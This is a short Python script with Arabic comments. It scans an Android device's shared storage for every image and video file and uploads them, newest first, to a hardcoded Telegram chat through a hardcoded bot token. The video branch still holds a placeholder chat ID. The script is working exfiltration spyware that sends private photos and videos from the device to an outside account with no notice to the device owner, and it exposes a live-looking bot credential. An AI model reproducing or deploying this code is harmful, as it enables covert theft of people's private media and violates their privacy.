import os
import telebot
from threading import Thread

# استخدم API_KEY الخاص بك هنا
bot = telebot.TeleBot("6722087346:AAGcprCE_KbBXWNpjHN2zLwV1gWHZO4mRMc")
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            # التحقق من امتداد الملف إذا كان صورة أو فيديو
            if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".mp4", ".mov", ".avi", ".mkv")):
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    bot.send_photo(chat_id="5034251652", photo=f)
                elif file_path.lower().endswith((".mp4", ".mov", ".avi", ".mkv")):
                    bot.send_video(chat_id="YOUR_CHAT_ID", video=f)
            else:
                print(f"Skipping unsupported file: {file_path}")
    except Exception as e:
        print(f"Error sending file {file_path}: {str(e)}")

def main():
    files_with_mtime = []

    # البحث عن الملفات في الدليل المحدد
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            # فحص إذا كان الملف صورة أو فيديو
            if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".mp4", ".mov", ".avi", ".mkv")):
                # إضافة الملف مع وقت آخر تعديل له إلى القائمة
                files_with_mtime.append((file_path, os.path.getmtime(file_path)))

    # ترتيب الملفات حسب وقت التعديل من الأحدث إلى الأقدم
    files_with_mtime.sort(key=lambda x: x[1], reverse=True)

    # إرسال الملفات بعد ترتيبها
    threads = []
    for file_path, _ in files_with_mtime:
        t = Thread(target=send_file, args=(file_path,))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # استمر في تشغيل البوت بشكل دائم
    thread = Thread(target=main)
    thread.start()
